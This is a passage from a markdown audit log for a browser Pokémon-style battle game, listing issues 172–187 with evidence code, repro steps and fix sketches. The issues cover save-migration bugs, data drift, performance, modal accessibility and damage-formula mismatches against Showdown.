_profMysteryMode = isFull;                                   // isFull = team.length >= cap(=6 post-G8)
_profLegendaryMysteryMode = _profMysteryMode && isPreLeagueLegendaryMysteryGate(cityIdx);
// renderCityActions: legendMysteryGate = swapMode && _legendaryGateHere; swapMode requires !hasTeamRoom.
```

**Repro**: Arrive at City 8 post-Gym-8 with a lean party (e.g. 4–5 mons, room under the cap of 6). The hub still labels the Professor button "Professor — New Team Member" (room=true path) and `enterProfessor` runs in NORMAL mode (`_profMysteryMode=false`), handing a regular 3-choice gift instead of the legendary. Route then unblocks via `profUsedHere`. The player walks Victory Road with NO legendary, despite the gate being framed as "Required" and "no challenger walks the final gate without a legendary in hand."

**Blast radius**: Narrative/consistency only — NOT a wedge (the run still completes). The "biggest decisions of the run" legendary gate is skippable by simply keeping a non-full party. (Prior-audit ISSUE-036; re-verified.)

**Fix sketch**: Decouple `_profLegendaryMysteryMode` from `isFull` at City 8 — when `isPreLeagueLegendaryMysteryGate(cityIdx)` is true, force legendary mode regardless of party fullness (offer the legendary into an open slot if there's room, else the swap flow). Or accept it as intentional and soften the "Required" copy.

---

## <a id="ISSUE-172"></a> ISSUE-172: `_loadedVer < 14` block missing — v14 trainer-name migration never runs for saves stamped at exactly v13

---
id: ISSUE-172
severity: P2
category: bug
anchor_symbol: load
current_line_hint: ~30943
file: battle.html
agents: [story-mode-investigator]
fingerprint: 157f95348987
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `_loadedVer < 14` block missing — v14 trainer-name migration never runs for saves stamped at exactly v13

**Evidence**:
```js
// battle.html ~30923  load() migration chain
const _loadedVer = d.version | 0;
if (_loadedVer < 8)  { migrateStoryTimelineIndicesFromPreV8(); }
if (_loadedVer < 9)  { migrateStoryTimelineIndicesFromPreV9(); }
if (_loadedVer < 10) { migrateStoryTrainerDisplayNamesPreV10(); }
if (_loadedVer < 11) { migrateStoryTrainerLegacyNamesPreV11(); }
if (_loadedVer < 12) { migrateStoryTrainerAssignmentsPreV12(); }
if (_loadedVer < 13) {                        // ← bundles v13 AND v14 fixes
    migrateStoryArtifactShopPreV13();
    migrateStoryTrainerAssignmentsPreV14();  // ← should be < 14, not < 13
}
// NO `if (_loadedVer < 14)` block exists
if (_loadedVer < 15) { migrateStoryPreV15(); }
```

The v14 migration is what remaps legacy trainer keys like `'Blue Champion'` / `'Red'` in Elite Trainer slots / `'Blue 2'` etc. — see `migrateStoryTrainerAssignmentsPreV14` body. A save that was opened in the v13 window (after v13 shipped but before v14 shipped) saves itself as `version: 13`. On the next load, `_loadedVer=13` → `< 13 is false` → v14 fix is skipped forever.

**Repro**: Manually edit a story save to `version: 13`. Confirm via load() that no v14 migration runs. Set `sm.trainerAssignments['34'] = 'Blue Champion'` (or similar legacy name); the assignment stays, even though all post-v14 callers expect canonical names.

**Blast radius**: Narrow — only saves that touched the brief v13 window. Symptoms: an Elite Trainer slot keeps a legacy "Champion"-class name; battle dispatch routes to Champion-style roster on what should be E1; victory line lookup misses.

**Fix sketch**: Split the v13 block into two:
```js
if (_loadedVer < 13) { try { migrateStoryArtifactShopPreV13(); } catch (e) {} }
if (_loadedVer < 14) { try { migrateStoryTrainerAssignmentsPreV14(); } catch (e) {} }
```

**Verification**: A `version: 13` save with `trainerAssignments['34'] = 'Blue Champion'` should be remapped after fix; pre-fix, it stays.

---

## <a id="ISSUE-173"></a> ISSUE-173: Migration chain is sound but unobservable — no boot-time shadow validation

---
id: ISSUE-173
severity: P2
category: dx
anchor_symbol: load
current_line_hint: ~32228
file: battle.html
agents: [story-mode-investigator]
fingerprint: 34a2703812f7
confidence: high
status: open
---

**Title**: Migration chain is sound but unobservable — no boot-time shadow validation

**Evidence**:
```js
if (!d || d.version < 2 || d.version > SAVE_VER) return false;   // forward saves rejected (good)
...
if (_loadedVer < 15) { try { migrateStoryPreV15(); } catch (e) { console.warn(...); } }
if (_loadedVer < 16) { try { migrateStoryPreV16(); } catch (e) { ... } }
// ... v17, v18, v19, v20, each version-gated, each try/caught
```

**Repro**: Static review of battle.html:32223–32390. The chain is correctly ordered (note: `migrateStoryPreV20` is DECLARED at 31735, BEFORE `migrateStoryPreV19` at 31754, but DISPATCHED in correct numeric order at 32325/32328 — safe). Each migration handles missing fields, coerces types, and is wrapped in try/catch with safety back-fills after the chain (32330–32352). v15 handles hardcore→normal, stable ids on team+pcBox, balls/pokedex/catchUnlocked defaults; v19 grandfathers IVs to 31 and refunds permBoosts; v20 seeds daycare/pits/bonus/tired.

**Blast radius**: A single migration silently no-op'ing (e.g. the documented `STORY_EVENTS_RAW` re-export trap in STORY_MODE_FLOW §8) would not surface until a player hit the affected feature.

**Fix sketch**: This is a positive confirmation (chain is correct) + a small hardening ask: add a dev-only post-migration assertion that the loaded `sm` matches the v20 shape (all required keys present, types correct), logged once on boot under `?debug`. Pairs with fixing the test gap above.

**Verification**: Load a v8/v11/v14/v19 fixture; confirm no console.warn fires and all fields resolve to v20 shape.

---

## <a id="ISSUE-174"></a> ISSUE-174: Pre-merge saves with partial unlockedGimmicks are not re-derived on load — Tera/Z silently withheld until next milestone win

---
id: ISSUE-174
severity: P2
category: bug
anchor_symbol: load
current_line_hint: ~32503
file: battle.html
agents: [story-mode-investigator]
fingerprint: 920d7e405954
confidence: high
status: open
---

**Title**: Pre-merge saves with partial unlockedGimmicks are not re-derived on load — Tera/Z silently withheld until next milestone win

**Evidence**:
The mechanics-unlock change (commit c4d6d55) makes all four gimmicks unlock together at badges>=5 via `slotsUnlocked = badges < 5 ? 0 : 4` — but this recompute lives ONLY in the battle-victory handler (`enterBattleEvent`, ~42749). `load()` (~32503) and the migration chain (v15–v21) never re-derive `sm.unlockedGimmicks` from `sm.badges`. A save written by the OLD per-badge drip (e.g. badges 6 → `['mega','dmax']`) loads unchanged:
```
After load: version 21 badges 6 unlockedGimmicks: ["mega","dmax"]
EXPECTED (post-merge, badges>=5): all 4 [mega,dmax,tera,z]
```
`_storyEnemyMechKeys` and `_mechForGimmickRoll` both read `sm.unlockedGimmicks` live, so Tera/Z capability is withheld from both player builds and enemy foes until the player wins the next milestone fight (which finally runs the new recompute).

**Repro**: `node scripts/debug/_repro/unlock-migration.mjs` — loads a `version:18` save, badges 6, `unlockedGimmicks:['mega','dmax']`; observe it stays partial after load.

**Blast radius**: Any player with an in-progress save (badges>=5) that crosses the v1.2.3 merge. Self-heals after one milestone victory, so non-catastrophic, but the headline feature (all-four-at-Colress) is silently absent for 1+ battles.

**Fix sketch**: Add a load-time/migration re-derivation: after migrations, recompute `sm.unlockedGimmicks = order.slice(0, sm.badges < 5 ? 0 : 4)` using the same `megaOn/dynaOn/teraOn/zOn` order. A `migrateStoryPreV22` is the natural home (the unlock-semantics change deserves a SAVE_VER bump anyway).

**Verification**: Re-run the repro; `unlockedGimmicks` should be `['mega','dmax','tera','z']` after load.

---

## <a id="ISSUE-175"></a> ISSUE-175: No save migration coerces stale `sm.mysteryIdentity`; pre-v22 saves render degraded MF reveal until the fight

---
id: ISSUE-175
severity: P2
category: bug
anchor_symbol: load
current_line_hint: ~35335
file: battle.html
agents: [story-mode-investigator]
fingerprint: 64fa9c188a86
confidence: medium
status: open
---

**Title**: No save migration coerces stale `sm.mysteryIdentity`; pre-v22 saves render degraded MF reveal until the fight

**Evidence**:
```js
// load() migration block (~35421-35486): touches tracks, daycare, pits, wander, stats —
// but never sm.mysteryIdentity. Coercion is lazy, only inside _storyEnsureMysteryIdentity():
function _storyEnsureMysteryIdentity() {
    if (sm.mysteryIdentity !== 'the_first') { sm.mysteryIdentity = 'the_first'; save(); }
    ...
}
```
`_storyEnsureMysteryIdentity()` runs only at the MF fight (`~47139`). The city-hub tease (`~43138`) and victory overlay (`~47918`) read `MYSTERY_FIGURE_IDENTITIES[sm.mysteryIdentity]` raw.

**Repro**: load a save with `sm.mysteryIdentity='cyrus'` (a retired key from a pre-v22 run). At the post-game city hub, `MYSTERY_FIGURE_IDENTITIES['cyrus']` is `undefined` → sprite falls to hardcoded `'Cyrus'` (`~43139`). At victory overlay before the fight, `face=null` → reveal shows "the figure dissolves before you can see who wore it" instead of "The First".

**Blast radius**: Cosmetic/narrative degradation for old saves, not a crash (guards prevent null-deref). Self-heals once `_storyEnsureMysteryIdentity` runs. Affects only saves carried across the PR-6 collapse.

**Fix sketch**: Add to the migration chain (or a generic back-fill near `~35484`): `if (sm.mysteryIdentity !== 'the_first') sm.mysteryIdentity = 'the_first';`. Pasteur-owned (save schema) — flag.

**Verification**: load old-identity save → `sm.mysteryIdentity === 'the_first'` immediately after `load()`, before any MF fight.

---

## <a id="ISSUE-176"></a> ISSUE-176: 6 builds in the gen*.json mirror omit `nature`; the CSV source has natures for all 17,398 rows (mirror drift)

---
id: ISSUE-176
severity: P2
category: inconsistency
anchor_symbol: loadBuildsCSV
current_line_hint: ~9870
file: data/builds/gen5.json
agents: [data-integrity-auditor]
fingerprint: 0c28760f1056
confidence: high
status: open
---

**Title**: 6 builds in the gen*.json mirror omit `nature`; the CSV source has natures for all 17,398 rows (mirror drift)

**Evidence**:
```js
// loadBuildsCSV defaults a blank nature to 'Hardy' (neutral):
const natureRaw = _csvDecodeOptions(row.nature, 'Hardy');   // 9870
const naturePicked = _csvPickOption(natureRaw, 'Hardy');    // 9876
// builds.csv: 0 rows with blank nature. JSON mirror: 6 builds with no nature key:
//   gen5 Aron/vgc2012/Level 1 Sturdy, gen5 Solosis/vgc2012/FEAR,
//   gen8 Mewtwo/balancedhackmons/Sheer Force, gen9 Landorus/godlygift/Nasty Plot,
//   gen9 Great Tusk/ubersuu/Choice Scarf, gen9 Iron Treads/ubersuu/Booster Speed Lead
```

**Repro**: `node` over `data/builds/gen{5,8,9}.json` — these 6 build objects lack a `nature` field. The same sets in `data/builds.csv` carry a nature.

**Blast radius**: Low for gameplay (CSV is authoritative and supplies the nature; the JSON-fallback path defaults to Hardy). But it is a symptom of CSV↔JSON drift — relevant because the retune touches natures and may regenerate one representation. Hand-editing the JSON for the retune would inherit the gap.

**Fix sketch**: Regenerate `data/builds/gen*.json` from `data/builds.csv` so every set carries the CSV's nature; or backfill the 6 missing `nature` keys to match the CSV.

**Verification**: Re-run a JSON-vs-CSV field-coverage diff; expect 0 nature-less JSON builds.

---

## <a id="ISSUE-177"></a> ISSUE-177: Engine-only `loadGameData` parse is ~308 ms (isolated from JSDOM), >1.5× the 200 ms boot target and scales with every new data table

---
id: ISSUE-177
severity: P2
category: perf
anchor_symbol: loadGameData
current_line_hint: ~9636
file: battle.html
agents: [performance-profiler]
fingerprint: 7819dea5a498
confidence: high
status: open
---

**Title**: Engine-only `loadGameData` parse is ~308 ms (isolated from JSDOM), >1.5× the 200 ms boot target and scales with every new data table

**Evidence**:
```js
// battle.html:9636 — JSON.parse of 5 tables in parallel, then per-key transform loops
const [speciesJSON, movesJSON, naturesJSON, itemsJSON, abilitiesJSON] = await Promise.all([
    fetch('data/species.json').then(r => r.json()),   // 1380 species → baseStats[]
    fetch('data/moves.json').then(r => r.json()),      // 954 moves → movesDB[]
    fetch('data/natures.json').then(r => r.json()),
    fetch('data/items.json').then(r => r.json()),
    fetch('data/abilities.json').then(r => r.json())]);
// …then await loadBuildsCSV() at battle.html:9743 parses the 2.6 MB data/builds.csv
```
Measured (jsdom, warm fetch stub serving from memory so disk I/O is excluded — this is pure parse+transform, separated from JSDOM document construction as the charter requested): re-invoking `window.loadGameData()` 5×: **median 308 ms, IQR 5.9 ms** (samples 308/314/396/306/308). The full jsdom cold boot is ~3–4 s but is dominated by JSDOM parsing the 3.6 MB monolith; this 308 ms is the slice the engine itself owns and the slice that grows when data tables are added.

**Repro**: `node --expose-gc` → `loadEngine()` → time `await window.loadGameData()` 5×; median ~308 ms. (`/tmp/final.mjs` in this session.)

**Blast radius**: This is the production boot floor minus JSDOM overhead — a real browser still pays the JSON.parse + 1380/954-key transform loops + 2.6 MB CSV parse behind the splash. It is **linear in table size**, so the redesign's egg tables, Fight Club rosters, and expanded story-pool each add directly to it. Distinct from the prior cold-boot finding (which measured the ~3 s full JSDOM boot + target mismatch); this isolates the engine's own parse budget.

**Fix sketch**: Defer the non-critical tables out of the boot path — `loadBuildsCSV()` (2.6 MB) and `op-abilities.json` are only needed at first draft/encounter, not at splash; parse them lazily on first use. Keep species/moves eager. Re-measure to confirm the eager slice stays < 200 ms as tables grow.

**Verification**: Re-time isolated `loadGameData()` after deferring the CSV; confirm the eager path is < 200 ms and that adding a redesign data table does not move it.

---

## <a id="ISSUE-178"></a> ISSUE-178: `logMsg` runs an O(903-keys) `Object.keys(tooltipDict)` scan on every log line — 0.32 ms median, 13.9 ms max per call

---
id: ISSUE-178
severity: P2
category: perf
anchor_symbol: logMsg
current_line_hint: ~14134
file: battle.html
agents: [performance-profiler]
fingerprint: 290cc0fb39e4
confidence: high
status: open
---

**Title**: `logMsg` runs an O(903-keys) `Object.keys(tooltipDict)` scan on every log line — 0.32 ms median, 13.9 ms max per call

**Evidence**:
```js
// battle.html:14148 — re-walks tooltipDict on every logMsg invocation
if (processedMsg.length < 200 && Object.keys(tooltipDict).length > 0) {
    for (let key of Object.keys(tooltipDict)) {        // 903 keys after items+abilities+natures load
        if (key.length > 3 && processedMsg.includes(key)) {
            processedMsg = processedMsg.replace(key, `<span ...>${key}</span>`);
            break;
        }
    }
}
```

There IS an existing helper `getTooltipKeysSorted()` at battle.html:9728 that caches `Object.keys(tooltipDict).filter(k => k.length > 3).sort((a,b) => b.length - a.length)` and is correctly invalidated on writes — but `logMsg` does not use it.

**Repro**: jsdom harness, populated tooltipDict (903 keys after `loadGameData`), 500 simulated `logMsg` calls hitting the same hot path: **median 0.319 ms, p95 0.597 ms, max 13.941 ms, mean 0.405 ms** (`/tmp/deep-perf4.mjs` in this session, 2026-05-28). Worst-case (no match → full scan): median 0.143 ms.

**Blast radius**: A normal turn fires 5–30 `logMsg` calls (move use, hit, crit, stat changes, status, ability procs, end-of-turn). A multi-hit move + Magic-Bounce reflect can fire 40+. At 0.3 ms each, that adds 1.5–12 ms of CPU to every turn purely from this scan. Worse: every `changeStage` (Decorate, Coaching, Calm Mind, Dragon Dance, Swords Dance, …) calls `logMsg` 1–3× — which is why the parseMoveEffects per-move benchmark shows status moves at 0.8–1.7 ms vs damage moves at 0.015 ms (a 50–100× spread). Touches every battle-log line; the highest-frequency code path in story mode.

**Fix sketch**: Switch `logMsg` to call `getTooltipKeysSorted()` (already cached + length-sorted) instead of re-doing `Object.keys` + filter on every call. Hoist the regex `/used (.+?)!/g` to a module-level constant — `String.prototype.replace` doesn't recompile but the literal still allocates per call.

**Verification**: Re-bench `logMsg` 500× after the swap; expect median to drop from 0.32 ms to under 0.05 ms (the inner `includes` loop becomes a single pass over the cached list, no `Object.keys` churn, no `filter` allocation). Parallel: re-bench `parseMoveEffects` for Decorate/Coaching/Calm Mind; expect 1.7 ms → < 0.3 ms.

---

## <a id="ISSUE-179"></a> ISSUE-179: 14 species have their ENTIRE standard-tier build pool tagged illegal — designed sets are dropped, foe falls back to randbats/Tackle

---
id: ISSUE-179
severity: P2
category: data
anchor_symbol: makeBuild
current_line_hint: ~11063
file: data/builds/gen9.json
agents: [data-integrity-auditor]
fingerprint: 1943fa0aafc9
confidence: high
status: open
---

**Title**: 14 species have their ENTIRE standard-tier build pool tagged illegal — designed sets are dropped, foe falls back to randbats/Tackle

**Evidence**:
```
// All standard builds illegal (legal=0) → pool emptied by makeBuild ~11068 when allowIllegal=false:
Samurott-Hisui(12) Kleavor(8) Decidueye-Hisui(4) Whirlipede(3) Growlithe-Hisui(3)
Banette-Mega(2) Necrozma-Ultra(2) Aerodactyl-Mega(1) Camerupt-Mega(1) Glalie-Mega(1)
Blastoise-Mega(1) Igglybuff(1) Ampharos-Mega(1) Sceptile-Mega(1)
// e.g. Whirlipede/zu wants "Speed Boost"; species.json Whirlipede = {Poison Point, Swarm, Quick Feet}
```
Three root causes: (A) species.json gen-staleness — Hisui formes missing gen9 abilities (Samurott-Hisui/Kleavor Sharpness); (B) Mega-forme builds list the PRE-mega base ability (Banette-Mega wants Frisk/Insomnia, but baseStats["Banette-Mega"]={Prankster}); (C) genuine Smogon-preset ability errors (Whirlipede never has Speed Boost; Igglybuff never has Competitive). ISSUE-054 lumps all 672 illegal pairs as "intended hackmons/mega"; this finding isolates the 14 where there is NO legal in-tier fallback, so the species is reduced to randbats/last-resort.

**Repro**: `node` scan of data/builds/*.json excluding EXOTIC_FORMAT_KEYS (battle.html ~11527) and doubles/vgc tiers, grouping per species: 14 species have legal=0 with illegal>0. Each then exercises makeBuild's randbats fallback (~11111) or the Tackle/Growl/Leer last resort (~11126).

**Blast radius**: Story-mode foe quality — any time `rollTrainerTeam` lands one of these 14 species, the player faces a randbats-quality or near-blank moveset instead of the curated tier set. Drifblim/Mimikyu/Marowak (raid bosses) are NOT affected — verified all 8 extra-raid bosses have legal>0 standard builds.

**Fix sketch**: (A) fix species.json abilities (see companion finding); (B) have `_isBuildAbilityIllegal` resolve a `-Mega`/`-Ultra` forme's legality against the BASE species' ability list (the mega ability is auto-granted on evolve, so the base-forme ability on the set is correct); (C) drop or correct the ~6 genuinely-wrong preset abilities in data/builds. Mega resolution is the highest-leverage single fix (covers 5 of the 14).

**Verification**: Re-run the all-illegal scan; the 14-species list shrinks to only any deliberately-retained CAP/exotic entries. Spot-check that a rolled Banette-Mega keeps its designed set instead of a randbats fallback.

---

## <a id="ISSUE-180"></a> ISSUE-180: Pre-v15 post-HoF saves are forced back through the Mystery Figure climax — postHofMysteryClimaxDone migration shadowed by default boolean

---
id: ISSUE-180
severity: P2
category: bug
anchor_symbol: migrateStoryPreV15
current_line_hint: ~32163
file: battle.html
agents: [story-mode-investigator]
fingerprint: 685e7677fbe1
confidence: high
status: open
---

**Title**: Pre-v15 post-HoF saves are forced back through the Mystery Figure climax — postHofMysteryClimaxDone migration shadowed by default boolean

**Evidence**: Same root cause as the balls-default bug. `migrateStoryPreV15` (~32163) intends to spare already-finished saves from re-running the post-HoF climax:
```js
if (typeof sm.postHofMysteryClimaxDone !== 'boolean') {
    sm.postHofMysteryClimaxDone = !!(sm.bossArc && sm.bossArc.available);
}
```
But the default `sm` initializes `postHofMysteryClimaxDone: false` (~32247) — already a boolean. After `Object.assign(sm, d)` with a pre-v15 save lacking the field, the `typeof !== 'boolean'` guard is false, so the boss-arc-aware default never runs. A pre-v15 post-HoF save (bossArc.available) loads with `postHofMysteryClimaxDone:false`.

**Repro**: `node scripts/debug/_repro/posthof-migration.mjs` → `version:14` save, `bossArc.available:true`, no `postHofMysteryClimaxDone` field → loads as `false` (migration intended `true`).

**Blast radius**: Pre-v15 players who already beat the Hall of Fame and unlocked the Caged God arc. On load they are routed back into the post-HoF Mystery Figure climax (`processNextEvent` row 67 recovery, ~38440) instead of the post-game. Disruptive but not a crash; the climax is winnable.

**Fix sketch**: Detect the missing field on the RAW save `d` (e.g. `!('postHofMysteryClimaxDone' in d)`) rather than `typeof sm.X`, since the default `sm` always supplies the field. Audit every `migrateStoryPreV*` guard of the form `if (typeof sm.X !== ...)` / `if (!sm.X)` against the default `sm` object (~32226) — `balls`, `postHofMysteryClimaxDone`, and any field the default pre-populates are subject to the same shadowing.

**Verification**: Re-run the repro; `postHofMysteryClimaxDone` should be `true` after migrating a pre-v15 post-HoF save.

---

## <a id="ISSUE-181"></a> ISSUE-181: 10 of 12 `.modal` overlays lack `role="dialog"` / `aria-modal` / labelledby

---
id: ISSUE-181
severity: P2
category: a11y
anchor_symbol: modal-dialog-roles
current_line_hint: ~7519
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: a8ccc1946cb8
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: 10 of 12 `.modal` overlays lack `role="dialog"` / `aria-modal` / labelledby

**Evidence**:
```
$ grep -nE 'role="dialog"' battle.html
7683:    <div id="modal-help" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="help-title">
7760:    <div id="modal-summary" class="modal hidden" role="dialog" aria-labelledby="sum-header-name" aria-modal="true">

$ grep -nE 'class="modal' battle.html | wc -l
12
```

Only `modal-help` and `modal-summary` declare themselves as dialogs. The remaining ten — `modal-settings`, `modal-story-run-summary`, `modal-story-abandon-confirm`, `modal-game-alert`, `modal-game-confirm`, `modal-online-host`, `modal-gauntlet-leaderboard`, `modal-online-pvp` (+ two more) — render as plain `<div class="modal">`. They function as modal dialogs (background blocks pointer events; titles like "Abandon this run?", "Host online battle"), so SR users get no context when they pop. `modal-game-alert` and `modal-game-confirm` are the in-page replacements for native `alert()`/`confirm()` (per the comment at line 7619) — these specifically must be dialogs.

**Repro**: Click ⚙ settings; open Story → Abandon Run; open Online → Host. SR announces "button" instead of "dialog, Settings / Abandon this run? / Host online battle".

**Blast radius**: Settings is the highest-frequency entry point. Abandon-Run is destructive. Both being unannounced is a real safety concern.

**Fix sketch**: Add `role="dialog" aria-modal="true"` to each `<div class="modal">`. Ensure the `<h2>` inside each has an `id`, and reference it via `aria-labelledby`. Centralise via `class="modal"` selector + a tiny `connectedCallback`-style init in JS so future modals inherit it.

**Verification**: `grep -cE 'class="modal[^"]*" *[^>]*role="dialog"' battle.html` returns 12.

---

## <a id="ISSUE-182"></a> ISSUE-182: Only `modal-summary` handles Escape — settings, abandon, alert, confirm modals trap keyboard users

---
id: ISSUE-182
severity: P2
category: a11y
anchor_symbol: modal-escape-key
current_line_hint: ~16555
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 44450b67ba55
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Only `modal-summary` handles Escape — settings, abandon, alert, confirm modals trap keyboard users

**Evidence**:
```
$ grep -nE "e.key === 'Escape'" battle.html
13021: moveOpen — closes move tooltip
16555: closes #modal-summary only
27015: closes a casino sheet (b / B / Escape)
29833: closes a one-off overlay
```

`closeModal('modal-X')` is wired up to a close button or click-on-backdrop on each modal, but the document-level Escape handler exists only for `modal-summary` (party summary). Keyboard-only players cannot dismiss `modal-settings`, `modal-game-alert`, `modal-game-confirm`, `modal-online-host`, `modal-online-pvp`, `modal-story-abandon-confirm`, `modal-story-run-summary`, or `modal-gauntlet-leaderboard` without hunting for the close button by Tab. `modal-game-alert` in particular blocks the entire game and is the in-page replacement for native `alert()` — native alerts close on Esc.

**Repro**: Open ⚙ Settings via keyboard, press Esc → nothing happens. Open Abandon Run, press Esc → nothing. Native-alert convention violated.

**Blast radius**: Every modal except summary. Pairs with the dialog-role finding (a11y users need both role + Esc).

**Fix sketch**: Generalise the `modal-summary` Escape handler into a single document-level `keydown` listener that finds the topmost non-hidden `.modal:not(.hidden)` and calls `closeModal(modal.id)`. Make sure `modal-game-confirm`'s Cancel path is invoked on Esc (since closing == cancelling).

**Verification**: Open each modal, press Esc → closes. `closeModal` runs.

---

## <a id="ISSUE-183"></a> ISSUE-183: Modals restore focus on close but never move focus INTO the dialog on open

---
id: ISSUE-183
severity: P2
category: a11y
anchor_symbol: openModal
current_line_hint: ~12995
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: c0f4bce71793
confidence: high
status: fixed-claude/relaxed-bell-2X3Ys
---

**Title**: Modals restore focus on close but never move focus INTO the dialog on open

**Evidence**:
```js
window.openModal = function(id) {
    const el = document.getElementById(id);
    if (!el) return;
    try { const prev = document.activeElement;
          if (prev && prev !== document.body) window._modalFocusStack.set(id, prev); } catch (e) {}
    el.classList.remove('hidden');   // <-- focus stays on the trigger behind the modal
};
```

**Repro**: Open Settings / Run Summary / any `role="dialog"` modal. Focus remains on the launching button behind the overlay; SR users aren't moved into the dialog and may keep reading the (now-inert) page beneath.

**Blast radius**: All `role="dialog" aria-modal="true"` modals (~20). Close-side focus *return* (L13009) and the global Escape handler (L13019) are already correct — this is only the open-side gap. The new gauntlet leaderboard/swap modals inherit this.

**Fix sketch**: In `openModal`, after unhiding, focus the dialog container (`tabindex="-1"`) or its first focusable control / close button.

**Verification**: On open, focus lands inside the dialog; on close it returns to the trigger (already works).

---

## <a id="ISSUE-184"></a> ISSUE-184: Burn halving & Ice Scales key off `move.cat`, not `_effectiveCat` — wrong for Photon Geyser / Shell Side Arm

---
id: ISSUE-184
severity: P2
category: bug
anchor_symbol: parseMoveEffects-effectiveCat-burn
current_line_hint: ~23500
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 1c1d60204985
confidence: medium
status: fixed-claude/funny-clarke-EnGMv
---

**Title**: Burn halving & Ice Scales key off `move.cat`, not `_effectiveCat` — wrong for Photon Geyser / Shell Side Arm

**Evidence**:
```js
// battle.html:23500 — burn uses move.cat
if (attacker.status === "BRN" && move.cat === "Physical" && attacker.ability !== "Guts") modifier *= 0.5;
// battle.html:23511 — Ice Scales uses move.cat
if (_defAbilityActive && defender.ability === "Ice Scales" && move.cat === "Special") modifier *= 0.5;
// but A/D and Fur Coat/Marvel Scale/Ruin/screens all correctly use _effectiveCat (set for Photon Geyser/Shell Side Arm)
```

Photon Geyser, Shell Side Arm, and Light That Burns the Sky are base-category "Special" (verified in
data/moves.json gen9) but the engine recomputes `_effectiveCat` to "Physical" when the user's Atk wins.
A burned attacker firing Photon Geyser as a physical hit (`_effectiveCat="Physical"`, `move.cat="Special"`)
**escapes the burn penalty** (engine over-damages; Showdown halves). Conversely Ice Scales wrongly halves a
Shell Side Arm that resolves Physical (`move.cat="Special"`) — engine under-damages; Showdown would not halve.

**Repro**: Burned Necrozma using Photon Geyser (physical) into a neutral wall: engine deals full damage; Showdown applies the ½ burn cut. Scenario spec — attacker.status="BRN", move=Photon Geyser with Atk>SpA; compare dealt damage with vs without the status. (Narrow: only ~3 category-flipping moves exist.)

**Blast radius**: Limited to Photon Geyser / Shell Side Arm (and Ultra Necrozma's Z-move) interacting with Burn or Ice Scales. Real but low frequency.

**Fix sketch**: Change both predicates to `_effectiveCat` (which is already computed above the modifier block and is what every other category-gated modifier uses): `_effectiveCat === "Physical"` for burn, `_effectiveCat === "Special"` for Ice Scales.

**Verification**: Burned Photon-Geyser-physical hit takes the ½ cut; Shell-Side-Arm-physical is not halved by Ice Scales. Compare against Showdown for both arms.

---

## <a id="ISSUE-185"></a> ISSUE-185: All damage modifiers collapsed into one multiply + single floor — Showdown floors per modifier (multi-HP drift)

---
id: ISSUE-185
severity: P2
category: inconsistency
anchor_symbol: parseMoveEffects-modifier-pipeline
current_line_hint: ~23489
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 7b9556a99fb4
confidence: high
status: open
---

**Title**: All damage modifiers collapsed into one multiply + single floor — Showdown floors per modifier (multi-HP drift)

**Evidence**:
```js
// battle.html:23489 — STAB, type, crit, roll, life orb, screens, weather-sports … all into one number
let modifier = stab * typeEff * crit * rng * lifeOrb;
// … ~70 lines of  modifier *= X …
// battle.html:23640 — a single floor at the end
let damage = Math.floor((Math.floor(Math.floor(22 * basePower * (A / D)) / 50) + 2) * modifier);
```

Showdown's `modifyDamage` applies each modifier as its own `tr(damage * mod)` step in a fixed order
(crit → random → STAB → typeEff for *each* defending type separately → burn → other), flooring between
each. Collapsing them into one product and flooring once accumulates the truncation error, and the gap grows with the number/size of modifiers.

**Repro**: `node scripts/debug/_repro/pipeline3.mjs` — Charizard Flamethrower (Fire STAB ×1.5) vs Scizor (Bug/Steel = 4× super-effective), roll 0.85, no crit: **engine "It dealt 270 damage"** (matches its single-floor `floor(53×1.5×4×0.85)=270` exactly) **vs Showdown sequential-floor = 268 → +2 HP drift.** A wider enumeration shows STAB+4× cases drifting by up to ~6–7 HP at low base damage. (Sub-symptoms: the A/D and damage-roll findings are concrete instances of this same "floor late" philosophy.)

**Blast radius**: Every multi-modifier hit, especially STAB + super-effective and STAB + super-effective + crit/screens/items. Systematically over-states damage vs Showdown. Affects KO ranges across the board.

**Fix sketch**: Apply modifiers sequentially with a floor (Showdown's `tr`/pokeRound) between each step in canonical order, rather than `floor(base × combinedProduct)`. Largest behavioral correctness win of the three; can be staged after the A/D and roll fixes since those are cleaner.

**Verification**: `scripts/debug/_repro/pipeline3.mjs` should report 268. Build a small matrix of (STAB, typeEff, crit, roll) cases and assert each matches `@smogon/calc` to the HP.

---

## <a id="ISSUE-186"></a> ISSUE-186: In-game help text still says "PC Storage (cap 10)" — actual PC_BOX_CAP is 30

---
id: ISSUE-186
severity: P2
category: inconsistency
anchor_symbol: PC_BOX_CAP
current_line_hint: ~10582
file: battle.html
agents: [story-mode-investigator]
fingerprint: 5f7903cb05a5
confidence: high
status: open
---

**Title**: In-game help text still says "PC Storage (cap 10)" — actual PC_BOX_CAP is 30

**Evidence**:
```js
// battle.html:10582 (story-mode help overlay)
"<b>Pokémon Center</b> — <b>PC Storage</b> (cap 10) for the partners you can't carry, ..."
// vs
const PC_BOX_CAP = 30;  // battle.html:42740
```

**Repro**: `grep -n "cap 10" battle.html`. The PC cap was raised to 30 (v-playtest per STORY_MODE_FLOW §7), the overflow modal and warning banner correctly use `PC_BOX_CAP` (42924/42938), and the catch overflow message says "(30/30)" — but the static help prose still reads "cap 10". The `inspect-save` skill doc and CODEBASE_MAP also still say cap 10 / SAVE_VER=15 (stale, separate from code).

**Blast radius**: Player-facing help under-states their storage by 3×; could prompt premature releases. Cosmetic but directly contradicts the live cap.

**Fix sketch**: Replace the literal "cap 10" in the help string with "cap ${PC_BOX_CAP}" (or the literal 30). Sweep for other "cap 10" / "10/10" prose.

**Verification**: `grep -n "cap 10\|10/10" battle.html` returns no user-facing PC strings.

---

## <a id="ISSUE-187"></a> ISSUE-187: Pokémon Center storage rows are mouse-only clickable divs (no keyboard access)

---
id: ISSUE-187
severity: P2
category: a11y
anchor_symbol: pcRenderStorage
current_line_hint: ~47557
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: d7eb819e92a0
confidence: high
status: open
---

